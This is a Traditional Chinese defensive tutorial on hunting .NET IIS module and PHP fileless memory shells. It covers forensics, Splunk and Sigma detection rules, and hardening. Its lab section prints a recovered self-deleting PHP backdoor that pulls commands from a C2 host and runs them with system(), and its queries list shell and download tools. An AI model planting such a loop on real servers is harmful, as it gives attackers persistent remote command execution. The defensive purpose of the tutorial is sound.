# 20.3 .NET 與 PHP 內存馬與無檔案後門排查 (DotNet & PHP Fileless Memory Shell Defense)

## 案發現場破題

除了 Java 生態系中知名的 Filter 內存馬外，在 Windows IIS 企業環境與大型 LAMP/LNMP Web 叢集中，**.NET 記憶體模組注入與 PHP 無檔案內存馬（PHP Fileless MemShell）** 同樣是紅隊與 APT 組織極度偏好的無痕滲透利器：
1. **.NET IIS HTTP 模組注入（IIS HttpModule Memshell）**：攻擊者透過反序列化漏洞或管理員權限，直接向當前 IIS 應用程式網域（AppDomain）動態注入實作了 `IHttpModule` 的非託管/託管 DLL，或攔截 `HttpApplication.BeginRequest` 事件。**完全不修改磁碟上的 `web.config`，重啟前永久常駐**。
2. **PHP FastCGI / OPcache 無檔案內存馬**：利用 PHP 執行緒的常駐性（如利用 `unlink(__FILE__)` 自我刪除檔案但保持 `while(1)` 背景掛起，或利用 OPcache 共享記憶體毒化），實現「磁碟上已無檔案，但外部 HTTP 仍可源源不絕觸發後門代碼」的靈異現象。

```
[攻擊者發送自訂標頭 HTTP 請求 (如 X-Auth-Key: secret)]
       │
       ▼ (請求抵達 Windows IIS 或 Linux Nginx+PHP-FPM)
+-------------------------------------------------------------------------------+
| Web 伺服器記憶體空間 (Process Heap & Shared Memory)                          |
|                                                                               |
|  [ 情況 A: IIS w3wp.exe .NET AppDomain ]                                      |
|    └─► 動態註冊之 IHttpModule (記憶體位元組碼載入，未登記於 web.config)        |
|                                                                               |
|  [ 情況 B: PHP-FPM Worker 進程 / OPcache 共享記憶體 ]                         |
|    └─► 記憶體中維持無限迴圈 while(1) 或遭毒化之 OPcache 抽象語法樹 (AST)       |
+-------------------------------------------------------------------------------+
       │
       ▼ (記憶體中直接呼叫 CreateProcess / popen 執行指令)
[回傳加密後之執行結果，磁碟稽核、檔案監控 inotify 全程靜默零告警]
```

### 痛點場景
- **檔案監控（File Integrity Monitoring, FIM）全面失效**：安全軟體針對網站根目錄（如 `C:\inetpub\wwwroot` 或 `/var/www/html`）進行雜湊監控，但攻擊者在執行後立即將木馬原始檔 `unlink()` 刪除，FIM 回報目錄乾淨無異常。
- **重啟才能清除的維運代價**：在金融或高併發電商生產環境中，隨意重啟 IIS 應用程式集區（AppPool）或 PHP-FPM 會導致大量交易中斷，缺乏在不停機狀況下的「在線熱排查與熱拔除」手段。
- **.NET 動態編譯產物隱蔽**：ASP.NET 會將頁面動態編譯至暫存目錄（`Temporary ASP.NET Files`），攻擊者利用反射將惡意 Assembly 載入記憶體，傳統掃毒引擎極難區分合法編譯快取與惡意代碼。

## 第一動：.NET 與 PHP 內存馬核心技術剖析 (Underlying Mechanics)

```
+-----------------------------------------------------------------------------------------------+
| .NET 與 PHP 內存馬底層技術對比                                                                 |
|                                                                                               |
| 1. .NET IIS 模組內存馬 (IHttpModule / Dynamic Module)                                         |
|    - 注入原理：透過反射調用 HttpApplication._moduleContainers，將自訂 Module 插入管線。      |
|    - 特點：攔截所有通過 IIS 處理之請求（包含靜態圖片與 HTML），具備全域掌控力。              |
|                                                                                               |
| 2. PHP 自刪除死循環內存馬 (Self-deleting Infinite Loop)                                       |
|    - 注入原理：腳本開頭執行 ignore_user_abort(true); set_time_limit(0); unlink(__FILE__);    |
|    - 特點：檔案自磁碟消失，但 PHP-FPM 子程序在記憶體中常駐，透過 file_get_contents 或 Socket   |
|            定期向外部輪詢拉取任務或常駐監聽本機 Socket。                                     |
|                                                                                               |
| 3. PHP OPcache 共享記憶體覆寫 (OPcache Poisoning)                                             |
|    - 注入原理：直接覆寫 /dev/shm 或記憶體中的 opcache.so 快取段，使合法檔案執行惡意字節碼。  |
+-----------------------------------------------------------------------------------------------+
```

### 關鍵威脅特徵對照

| 威脅維度 | .NET IIS 內存馬特徵 | PHP 無檔案內存馬特徵 |
| :--- | :--- | :--- |
| **程序內部跡象** | `w3wp.exe` 載入了未簽名或無檔案對應之 Dynamic Assembly。 | `php-fpm` 程序持有已標記為 `(deleted)` 的開啟檔案描述元（FD）。 |
| **觸發模式** | 劫持 `Application_BeginRequest` 事件。 | 常駐 Background Worker 或定期檢查特定 Header。 |
| **取證定位方法** | 使用 Process Hacker / WinDbg 審查 AppDomain 模組清單。 | 透過 `/proc/<PID>/fd` 與 `lsof -p <PID>` 清查斷鏈檔案。 |

## 第二動：工具鏈實戰：WinDbg 記憶體轉儲與 Linux Proc 取證 (Toolchain Practice)

### 1. Windows IIS 記憶體轉儲與 SOS 擴充套件調試 (.NET 取證)
```powershell
# 1. 使用 ProcDump 在不中斷服務下匯出 w3wp.exe 記憶體鏡像
procdump.exe -ma w3wp.exe C:\inetpub\w3wp_dump.dmp

# 2. 啟動 WinDbg 載入 SOS 擴充套件審查 AppDomain
# 在 WinDbg 中執行：
.loadby sos clr
!dumpdomain
```
- 檢查輸出中是否有 `Assembly` 名稱異常、或無對應磁碟路徑的動態組件。

### 2. Linux PHP-FPM 斷鏈進程取證 (排查已刪除的內存馬)
```bash
# 檢查所有 php-fpm 程序開啟的檔案描述元，抓出所有帶有 (deleted) 的異常腳本
ls -l /proc/[0-9]*/fd/* 2>/dev/null | grep "(deleted)" | grep -E "\.php"

# 若發現 /proc/1234/fd/4 -> /var/www/html/shell.php (deleted)
# 直接將記憶體中的檔案內容完整還原出來！
cp /proc/1234/fd/4 /tmp/recovered_memshell.php
cat /tmp/recovered_memshell.php
```

## 第四動：SIEM 關聯規則與即時獵捕分析 (Splunk & Sigma Rules)

### 1. Splunk SPL：偵測 Linux 環境中 PHP 程序衍生子進程 (PHP Spawning Shell)
```spl
index=os_logs sourcetype="syslog" OR sourcetype="auditd"
| rex field=_raw "type=EXECVE.*a0=\"(?<cmd>[^\"]+)\".*comm=\"(?<parent_comm>[^\"]+)\""
| search parent_comm="php-fpm" AND cmd IN ("/bin/sh", "/bin/bash", "/usr/bin/python", "/usr/bin/curl", "/usr/bin/wget")
| stats count earliest(_time) as first_seen latest(_time) as last_seen by host, parent_comm, cmd
| convert ctime(first_seen) ctime(last_seen)
| table first_seen, last_seen, host, parent_comm, cmd, count
```

### 2. Splunk SPL：偵測 IIS w3wp.exe 異常拉起 cmd/powershell
```spl
index=sysmon EventCode=1 ParentImage="*\\w3wp.exe" 
    Image IN ("*\\cmd.exe", "*\\powershell.exe", "*\\whoami.exe", "*\\net.exe")
| table _time, Computer, ParentCommandLine, CommandLine, User
```

### 3. Sigma 偵測規則：PHP-FPM Deleted Script Process Activity
```yaml
title: PHP-FPM Executing from Deleted File Descriptor
id: 3c8192a0-41bb-4521-9aef-881920acb012
status: production
description: 偵測 PHP-FPM 行程讀取已自磁碟刪除之檔案描述元，高度符合無檔案死循環內存馬行為
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        ParentImage|endswith: '/php-fpm'
        CommandLine|contains: '(deleted)'
    condition: selection
level: critical
```

## 第五動：內存馬熱查殺與架構防護加固 (Containment & Hardening)

```
[排查定位到常駐 PID]
       │
       ├── 1. Linux: kill -9 <PID> (殺死持有 deleted FD 的特定常駐 Worker)
       ├── 2. 重載 PHP-FPM (systemctl reload php-fpm - 釋放 OPcache 記憶體段)
       ▼
 [在 php.ini 停用危險函數 ➔ 杜絕內存馬執行外部指令]
```

### 1. PHP-FPM 運行時安全加固 (`php.ini`)
徹底停用惡意內存馬賴以執行的系統呼叫與超時控制：
```ini
; 1. 禁用高危執行函數
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source

; 2. 嚴格限制執行時間 (防止死循環內存馬常駐)
max_execution_time = 30
max_input_time = 30

; 3. 限制開啟檔案目錄 (Open Basedir 隔離)
open_basedir = /var/www/html/:/tmp/
```

### 2. Windows IIS 應用程式集區防護
- 將 Application Pool Identity 設定為專屬之低特權身分（如 `ApplicationPoolIdentity`），嚴格拒絕使用 `LocalSystem`。
- 定期設定「回收間隔（Recycling Conditions）」，例如每 24 小時強制回收 Worker Process，迫使記憶體中未持久化的動態模組失效。

## 靶場實戰：PHP 常駐無檔案木馬取證還原

### 靶場環境情境
- **Web 伺服器**: `Web-PHP-01` (Nginx + PHP-FPM 8.1)
- **警報觸發**: 主機對外流量監控顯示，每隔 5 分鐘出現一次對外部 неизвестен IP 的 HTTP POST 連線，但全站目錄經 YARA 掃描無任何惡意 PHP 檔案。

### 實戰步驟一：排查進程與檔案描述元 (FD)
1. 登入主機，執行：
   ```bash
   lsof +L1 | grep php-fpm
   ```
2. 輸出清晰顯示：
   `php-fpm  14205  www-data    3r   REG  253,1    1420     0  /var/www/html/.cache.php (deleted)`
   確認 PID 14205 正在運行一個磁碟上已被標記刪除的 `.cache.php`！

### 實戰步驟二：記憶體逆向還原
1. 直接從 `/proc/14205/fd/3` 複製出原始內容：
   ```bash
   cp /proc/14205/fd/3 /tmp/evidence_memshell.php
   cat /tmp/evidence_memshell.php
   ```
2. 鑑識發現代碼結構：
   ```php
   <?php
   ignore_user_abort(true);
   set_time_limit(0);
   unlink(__FILE__);
   while(1) {
       $cmd = file_get_contents("http://c2-server.xyz/task");
       system($cmd);
       sleep(300);
   }
   ```

### 實戰步驟三：應急止血與清理
1. 執行 `kill -9 14205` 強制終止該殭屍 Worker 進程。
2. 在 `php.ini` 中將 `system` 列入 `disable_functions`，重啟 PHP-FPM。
